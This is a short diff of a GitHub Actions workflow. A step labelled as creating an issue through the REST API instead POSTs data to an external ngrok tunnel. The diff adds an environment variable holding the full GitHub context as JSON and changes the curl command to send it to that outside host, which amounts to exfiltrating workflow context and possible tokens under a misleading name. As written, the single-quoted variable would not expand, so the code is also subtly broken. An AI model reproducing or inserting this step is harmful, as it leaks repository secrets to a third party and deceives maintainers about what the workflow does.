@@ -11,6 +11,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: Create issue using REST API
+      env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
       run: |
-        curl -d '{"key1":"value1", "key2":"kitty"}' -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
+        curl -d '{$GITHUB_CONTEXT}' -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
+
      
